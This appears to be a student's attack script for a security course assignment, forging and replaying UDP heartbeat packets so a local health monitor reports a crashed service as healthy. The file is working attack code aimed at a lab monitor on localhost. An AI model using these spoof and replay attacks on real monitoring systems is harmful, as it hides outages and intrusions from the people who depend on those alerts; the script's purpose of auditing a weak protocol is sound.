"""
Attacker file for M1.1 
Authored by Cameron Hugg
"""


import argparse
import datetime
import json
import socket
import sys
import time
 
# Defaults match the team's monitor (monitor.py binds 127.0.0.1:9999).
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 9999
DEFAULT_INTERVAL = 1.0          # Send period < W (3.0s) keeps the window alive.
DEFAULT_CAPTURE_PORT = 9998     # Point the service here to capture one real beat.
DEFAULT_CAPTURE_FILE = "captured_beat.bin"
SERVICE_NAME = "auth-ticket-daemon"
 
 
def ts() -> str:
    """Local timestamp with millisecond precision, matching the monitor's style."""
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
 
 
def log(tag: str, message: str) -> None:
    print(f"[{ts()}] [{tag}] {message}", flush=True)
 
 
def forge_payload(seq: int, service: str) -> bytes:
    """Build a forged HEARTBEAT datagram matching service.py's wire schema."""
    payload = {
        "type": "HEARTBEAT",
        "service": service,
        "seq": seq,
        "timestamp": time.time(),   # Fresh timestamp - but the monitor ignores it.
        "status": "HEALTHY",
    }
    return json.dumps(payload).encode("utf-8")
 
 
def attack_spoof(host: str, port: int, interval: float, count: int, service: str) -> None:
    """Attack 1: stream forged heartbeats so the monitor reports HEALTHY."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    log("SPOOF", f"Forging HEARTBEAT datagrams -> {host}:{port} every {interval:.2f}s")
    log("SPOOF", "The monitor cannot distinguish these from the real service.")
    seq = 0
    try:
        while count == 0 or seq < count:
            seq += 1
            packet = forge_payload(seq, service)
            sock.sendto(packet, (host, port))
            log("SPOOF", f"sent forged beat seq={seq} status=HEALTHY ({len(packet)} bytes)")
            time.sleep(interval)
    except KeyboardInterrupt:
        log("SPOOF", "stopped by operator.")
    finally:
        sock.close()
 
 
def attack_capture(capture_port: int, capture_file: str) -> None:
    """Capture helper: save one genuine heartbeat for later replay.
 
    Run the critical service pointed at this capture port, e.g.:
        python3 files/service.py --port <capture_port>
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((DEFAULT_HOST, capture_port))
    log("CAPTURE", f"Listening on UDP {DEFAULT_HOST}:{capture_port} for one real heartbeat...")
    log("CAPTURE", f"Point the service here:  python3 files/service.py --port {capture_port}")
    try:
        while True:
            data, addr = sock.recvfrom(4096)
            try:
                payload = json.loads(data.decode("utf-8"))
            except (UnicodeDecodeError, json.JSONDecodeError):
                log("CAPTURE", f"ignored non-JSON packet from {addr[0]}:{addr[1]}")
                continue
            if payload.get("type") != "HEARTBEAT":
                log("CAPTURE", f"ignored non-heartbeat packet from {addr[0]}:{addr[1]}")
                continue
            with open(capture_file, "wb") as f:
                f.write(data)
            log("CAPTURE", f"captured genuine beat seq={payload.get('seq')} "
                           f"timestamp={payload.get('timestamp')} -> saved to {capture_file}")
            log("CAPTURE", "done. Crash the service, then run --attack replay.")
            break
    except KeyboardInterrupt:
        log("CAPTURE", "stopped by operator.")
    finally:
        sock.close()
 
 
def attack_replay(host: str, port: int, interval: float, count: int, capture_file: str) -> None:
    """Attack 2: replay one captured heartbeat verbatim to mask downtime."""
    try:
        with open(capture_file, "rb") as f:
            packet = f.read()
    except OSError as err:
        log("REPLAY", f"could not read {capture_file}: {err}")
        log("REPLAY", "run '--attack capture' first to record a real beat.")
        sys.exit(1)
 
    try:
        info = json.loads(packet.decode("utf-8"))
        detail = f"seq={info.get('seq')} timestamp={info.get('timestamp')} (stale)"
    except (UnicodeDecodeError, json.JSONDecodeError):
        detail = f"{len(packet)} raw bytes"
 
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    log("REPLAY", f"Replaying captured beat [{detail}] -> {host}:{port} every {interval:.2f}s")
    log("REPLAY", "The payload never changes; the monitor never checks freshness.")
    sent = 0
    try:
        while count == 0 or sent < count:
            sock.sendto(packet, (host, port))
            sent += 1
            log("REPLAY", f"replayed stale beat #{sent} ({len(packet)} bytes)")
            time.sleep(interval)
    except KeyboardInterrupt:
        log("REPLAY", "stopped by operator.")
    finally:
        sock.close()
 
 
def main() -> None:
    parser = argparse.ArgumentParser(
        description="CS456 adversarial auditor: spoof/replay attacks on the heartbeat monitor.")
    parser.add_argument("--attack", required=True, choices=["spoof", "capture", "replay"],
                        help="which action to run")
    parser.add_argument("--host", default=DEFAULT_HOST,
                        help=f"monitor host to attack (default: {DEFAULT_HOST})")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT,
                        help=f"monitor UDP port to attack (default: {DEFAULT_PORT})")
    parser.add_argument("--interval", type=float, default=DEFAULT_INTERVAL,
                        help=f"send period in seconds; keep < W=3.0s (default: {DEFAULT_INTERVAL})")
    parser.add_argument("--count", type=int, default=0,
                        help="number of packets to send, 0 = until interrupted (default: 0)")
    parser.add_argument("--service", default=SERVICE_NAME,
                        help=f"service name to impersonate when spoofing (default: {SERVICE_NAME})")
    parser.add_argument("--capture-port", type=int, default=DEFAULT_CAPTURE_PORT,
                        help=f"port to capture a real beat on (default: {DEFAULT_CAPTURE_PORT})")
    parser.add_argument("--capture-file", default=DEFAULT_CAPTURE_FILE,
                        help=f"file holding the captured beat (default: {DEFAULT_CAPTURE_FILE})")
    args = parser.parse_args()
 
    print("=" * 72)
    log("INIT", "CS456 Adversarial Audit Script (attacker.py)")
    print("=" * 72)
 
    if args.attack == "spoof":
        attack_spoof(args.host, args.port, args.interval, args.count, args.service)
    elif args.attack == "capture":
        attack_capture(args.capture_port, args.capture_file)
    elif args.attack == "replay":
        attack_replay(args.host, args.port, args.interval, args.count, args.capture_file)
 
 
if __name__ == "__main__":
    main()
 
